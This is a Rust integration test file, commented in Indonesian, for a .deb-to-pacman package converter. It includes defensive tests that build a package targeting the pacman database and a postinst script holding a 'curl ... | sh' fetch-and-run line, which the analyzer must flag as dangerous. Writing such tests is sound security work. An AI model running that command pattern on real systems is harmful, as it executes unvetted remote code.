//! Uji integrasi alur penuh: `.deb` sintetis → analisis → konversi.

use deb_installer_core::deb::DebPackage;
use deb_installer_core::deps::{DepMapper, DepStatus, MappingTable};
use deb_installer_core::pkgbuild::{BuildOptions, PackageBuilder};
use deb_installer_core::scripts;
use deb_installer_core::security;
use std::io::Write;
use std::path::{Path, PathBuf};

/// Penulisan arsip ar minimal untuk membuat `.deb` uji.
struct DebBuilder {
    control: String,
    control_scripts: Vec<(String, String)>,
    files: Vec<(String, Vec<u8>, u32)>,
    symlinks: Vec<(String, String)>,
}

impl DebBuilder {
    fn new(control: &str) -> Self {
        Self {
            control: control.to_string(),
            control_scripts: Vec::new(),
            files: Vec::new(),
            symlinks: Vec::new(),
        }
    }

    fn script(mut self, name: &str, body: &str) -> Self {
        self.control_scripts
            .push((name.to_string(), body.to_string()));
        self
    }

    fn file(mut self, path: &str, content: &[u8], mode: u32) -> Self {
        self.files.push((path.to_string(), content.to_vec(), mode));
        self
    }

    fn symlink(mut self, path: &str, target: &str) -> Self {
        self.symlinks.push((path.to_string(), target.to_string()));
        self
    }

    fn write(self, dir: &Path, name: &str) -> PathBuf {
        let path = dir.join(name);
        let mut out = std::fs::File::create(&path).unwrap();

        let mut control_tar = Vec::new();
        {
            let mut builder = tar::Builder::new(&mut control_tar);
            append_file(&mut builder, "./control", self.control.as_bytes(), 0o644);
            for (script_name, body) in &self.control_scripts {
                append_file(
                    &mut builder,
                    &format!("./{script_name}"),
                    body.as_bytes(),
                    0o755,
                );
            }
            builder.finish().unwrap();
        }
        let control_tar = gzip(&control_tar);

        let mut data_tar = Vec::new();
        {
            let mut builder = tar::Builder::new(&mut data_tar);
            for (file_path, content, mode) in &self.files {
                append_file(&mut builder, &format!("./{file_path}"), content, *mode);
            }
            for (link_path, target) in &self.symlinks {
                let mut header = tar::Header::new_gnu();
                header.set_entry_type(tar::EntryType::Symlink);
                header.set_size(0);
                header.set_mode(0o777);
                header.set_mtime(1_700_000_000);
                header.set_link_name(target).unwrap();
                header.set_cksum();
                builder
                    .append_data(&mut header, format!("./{link_path}"), std::io::empty())
                    .unwrap();
            }
            builder.finish().unwrap();
        }
        let data_tar = gzip(&data_tar);

        out.write_all(b"!<arch>\n").unwrap();
        write_member(&mut out, "debian-binary", b"2.0\n");
        write_member(&mut out, "control.tar.gz", &control_tar);
        write_member(&mut out, "data.tar.gz", &data_tar);
        path
    }
}

fn append_file(builder: &mut tar::Builder<&mut Vec<u8>>, path: &str, content: &[u8], mode: u32) {
    let mut header = tar::Header::new_gnu();
    header.set_size(content.len() as u64);
    header.set_mode(mode);
    header.set_mtime(1_700_000_000);
    header.set_cksum();
    builder.append_data(&mut header, path, content).unwrap();
}

fn write_member(out: &mut std::fs::File, name: &str, data: &[u8]) {
    out.write_all(format!("{name:<16}").as_bytes()).unwrap();
    out.write_all(format!("{:<12}", 0).as_bytes()).unwrap();
    out.write_all(format!("{:<6}", 0).as_bytes()).unwrap();
    out.write_all(format!("{:<6}", 0).as_bytes()).unwrap();
    out.write_all(format!("{:<8}", 0o100644).as_bytes())
        .unwrap();
    out.write_all(format!("{:<10}", data.len()).as_bytes())
        .unwrap();
    out.write_all(b"`\n").unwrap();
    out.write_all(data).unwrap();
    if data.len() % 2 == 1 {
        out.write_all(b"\n").unwrap();
    }
}

fn gzip(input: &[u8]) -> Vec<u8> {
    let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
    enc.write_all(input).unwrap();
    enc.finish().unwrap()
}

const CONTROL: &str = "Package: demo-app\nVersion: 2:1.4.0-2\nArchitecture: amd64\nMaintainer: Demo <demo@example.com>\nHomepage: https://example.com\nDepends: libc6 (>= 2.34), libssl3, dpkg\nDescription: Demo application\n Longer description line.\n";

#[test]
fn converts_deb_into_installable_package() {
    let dir = tempfile::tempdir().unwrap();
    let deb_path = DebBuilder::new(CONTROL)
        .script("postinst", "#!/bin/sh\nupdate-desktop-database -q\n")
        .file("usr/bin/demo", b"#!/bin/sh\necho demo\n", 0o755)
        .file("usr/lib/x86_64-linux-gnu/libdemo.so.1", b"\x7fELF", 0o644)
        .file("bin/demo-legacy", b"#!/bin/sh\n", 0o755)
        .symlink("usr/bin/demo-link", "/bin/demo-legacy")
        .write(dir.path(), "demo.deb");

    let deb = DebPackage::open(&deb_path).unwrap();
    assert_eq!(deb.control.package().unwrap(), "demo-app");
    assert_eq!(deb.control.depends().len(), 3);

    let entries = deb.data_entries().unwrap();
    let paths: Vec<&str> = entries.iter().map(|e| e.path.as_str()).collect();
    assert!(paths.contains(&"usr/lib/x86_64-linux-gnu/libdemo.so.1"));

    let report = scripts::analyze(&deb.maintainer_scripts());
    assert_eq!(report.max_risk(), scripts::Risk::Safe);
    assert!(scripts::build_install_script(&report)
        .unwrap()
        .contains("update-desktop-database"));

    let mut mapper = DepMapper::new(
        MappingTable::builtin(),
        deb_installer_core::deps::SystemPacman::new(),
    );
    mapper.allow_network = false;
    let deps = mapper.resolve_all(&deb.control.depends());
    assert_eq!(deps[0].arch_name.as_deref(), Some("glibc"));
    assert_eq!(deps[1].arch_name.as_deref(), Some("openssl"));
    assert_ne!(deps[1].status, DepStatus::Missing);
    assert_eq!(deps[2].status, DepStatus::Ignored);

    let out = dir.path().join("out");
    let staging = dir.path().join("stage");
    let options = BuildOptions::new(&staging, &out);
    let result = PackageBuilder::new(&deb, options).build(&deps).unwrap();

    assert_eq!(result.pkgname, "demo-app-deb");
    assert_eq!(result.pkgver, "1.4.0");
    assert_eq!(result.pkgrel, "2");
    assert_eq!(result.arch, "x86_64");
    // Paket khusus Debian (`dpkg`) tidak boleh menjadi dependensi paket.
    assert!(result.dependencies.contains(&"glibc".to_string()));
    assert!(!result.dependencies.iter().any(|d| d == "dpkg"));
    assert!(result.package_path.exists());

    // Path dinormalisasi: multiarch dibuang, /bin → /usr/bin.
    assert!(!staging.join("usr/lib/x86_64-linux-gnu").exists());
    assert!(staging.join("usr/lib/libdemo.so.1").exists());
    assert!(staging.join("usr/bin/demo-legacy").exists());
    assert!(!staging.join("bin").exists());

    // Symlink absolut ditulis ulang ke lokasi Arch.
    let link = std::fs::read_link(staging.join("usr/bin/demo-link")).unwrap();
    assert_eq!(link.to_string_lossy(), "/usr/bin/demo-legacy");

    // Metadata paket lengkap.
    assert!(staging.join(".PKGINFO").exists());
    assert!(staging.join(".MTREE").exists());
    assert!(staging.join(".INSTALL").exists());

    let pkginfo = std::fs::read_to_string(staging.join(".PKGINFO")).unwrap();
    assert!(pkginfo.contains("pkgname = demo-app-deb"));
    assert!(pkginfo.contains("pkgver = 2:1.4.0-2"));
    assert!(pkginfo.contains("depend = glibc"));
    assert!(!pkginfo.contains("depend = dpkg"));
    assert!(pkginfo.contains(&format!("xdata = debian-sha256={}", deb.sha256)));
    assert!(pkginfo.contains("xdata = debian-arch=amd64"));
}

#[test]
fn package_archive_contains_normalized_paths() {
    let dir = tempfile::tempdir().unwrap();
    let deb_path = DebBuilder::new(CONTROL)
        .file("usr/bin/demo", b"binary", 0o755)
        .write(dir.path(), "demo.deb");

    let deb = DebPackage::open(&deb_path).unwrap();
    let out = dir.path().join("out");
    let staging = dir.path().join("stage");
    let result = PackageBuilder::new(&deb, BuildOptions::new(&staging, &out))
        .build(&[])
        .unwrap();

    let file = std::fs::File::open(&result.package_path).unwrap();
    let decoder = zstd::stream::read::Decoder::new(file).unwrap();
    let mut archive = tar::Archive::new(decoder);
    let names: Vec<String> = archive
        .entries()
        .unwrap()
        .map(|e| e.unwrap().path().unwrap().to_string_lossy().to_string())
        .collect();

    assert!(names.contains(&".PKGINFO".to_string()));
    assert!(names.contains(&".MTREE".to_string()));
    assert!(names.contains(&"usr/bin/demo".to_string()));
    // Direktori disimpan dengan akhiran `/` agar pacman mengenalinya.
    assert!(names.contains(&"usr/".to_string()));
    assert!(names.contains(&"usr/bin/".to_string()));
}

#[test]
fn refuses_package_that_targets_pacman_database() {
    let dir = tempfile::tempdir().unwrap();
    let deb_path = DebBuilder::new(CONTROL)
        .file("var/lib/pacman/local/evil/desc", b"x", 0o644)
        .file("usr/bin/demo", b"binary", 0o755)
        .write(dir.path(), "evil.deb");

    let deb = DebPackage::open(&deb_path).unwrap();
    let entries = deb.data_entries().unwrap();
    let hits = security::scan(
        entries
            .iter()
            .map(|e| deb_installer_core::normalize::normalize_path(&e.path)),
    );
    assert_eq!(hits.len(), 1);
    assert_eq!(hits[0].level, security::Sensitivity::Forbidden);

    let out = dir.path().join("out");
    let staging = dir.path().join("stage");
    let err = PackageBuilder::new(&deb, BuildOptions::new(&staging, &out))
        .build(&[])
        .unwrap_err();
    assert!(err.to_string().contains("dilindungi"), "{err}");
    // Staging tidak boleh berisi berkas terlarang.
    assert!(!staging.join("var/lib/pacman").exists());
}

#[test]
fn warns_on_dangerous_maintainer_script_without_executing_it() {
    let dir = tempfile::tempdir().unwrap();
    let deb_path = DebBuilder::new(CONTROL)
        .script(
            "postinst",
            "#!/bin/sh\ncurl -sSL https://example.com/x.sh | sh\n",
        )
        .file("usr/bin/demo", b"binary", 0o755)
        .write(dir.path(), "risky.deb");

    let deb = DebPackage::open(&deb_path).unwrap();
    let report = scripts::analyze(&deb.maintainer_scripts());
    assert_eq!(report.max_risk(), scripts::Risk::Dangerous);
    assert!(scripts::build_install_script(&report).is_none());

    let out = dir.path().join("out");
    let staging = dir.path().join("stage");
    let result = PackageBuilder::new(&deb, BuildOptions::new(&staging, &out))
        .build(&[])
        .unwrap();
    // Script asli tidak pernah diterjemahkan ke .INSTALL.
    assert!(result.install_script.is_none());
    assert!(!staging.join(".INSTALL").exists());
}
